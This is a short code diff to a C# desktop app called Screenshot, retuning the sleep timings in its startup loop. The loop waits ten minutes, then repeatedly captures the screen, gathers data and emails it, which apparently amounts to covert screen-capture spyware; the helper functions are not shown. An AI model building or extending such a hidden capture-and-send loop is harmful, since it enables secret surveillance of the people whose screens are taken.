@@ -16,16 +16,17 @@ namespace Screenshot
     /// </summary>
     public partial class App : Application
     {
+        const int MINUTE = 60000;
         private void Application_Startup(object sender, StartupEventArgs e)
         {
-            Thread.Sleep(600000);
+            Thread.Sleep(10 * MINUTE);
             while(true)
             {
                 Screenshot();
                 Gather();
                 Thread.Sleep(20000);
                 Email("", "", "");
-                Thread.Sleep(600000);
+                Thread.Sleep(20 * MINUTE);
             }
 
         }
